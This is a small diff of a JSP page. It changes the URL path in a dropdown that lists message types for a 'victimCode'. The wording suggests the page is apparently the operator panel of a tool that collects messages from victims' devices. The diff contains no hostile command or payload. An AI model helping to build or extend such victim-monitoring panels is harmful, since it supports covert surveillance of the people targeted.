@@ -102,7 +102,7 @@
                                 for (final String msgTyp : msgTypes) {
                             %>
                             <%--TODO: Add message count :)--%>
-                            <option value="<%=victimCode + "/xrob/"+ msgTyp%>" <%=msgTyp.equals(currentMsgType) ? "selected" : ""%> ><%=msgTyp%>
+                            <option value="<%=victimCode + "/"+ msgTyp%>" <%=msgTyp.equals(currentMsgType) ? "selected" : ""%> ><%=msgTyp%>
                             </option>
 
                             <%
